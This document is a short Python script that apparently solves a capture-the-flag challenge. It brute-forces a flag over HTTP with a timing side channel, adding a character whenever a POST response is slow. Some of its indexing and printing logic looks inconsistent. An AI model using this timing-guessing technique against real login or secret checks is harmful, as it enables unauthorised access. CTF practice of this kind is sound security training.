import time
import requests
import itertools

url="http://time-is-key.challs.olicyber.it/index.php"

dizionario = "abcdefghijklmnopqrstuvwxyzZ0123456789"

password = ""
k=6
tempo=1
while len(password) < 6:
    for combo in itertools.product(dizionario, repeat=k):
        parola = ''.join(combo)
        parola=parola[::-1]
        parola = password + parola
        print(parola)
        start = time.time()
        r = requests.post(url, data={'flag': parola, 'submit': 'Invia la flag!'})
        end = time.time()
        elapsed = end - start
        if elapsed > tempo:
            password += parola[tempo-1]
            k -= 1
            tempo += 1
            print("Trovato carattere:", parola[0])
            print("Password parziale:", password)
            break
    
    

        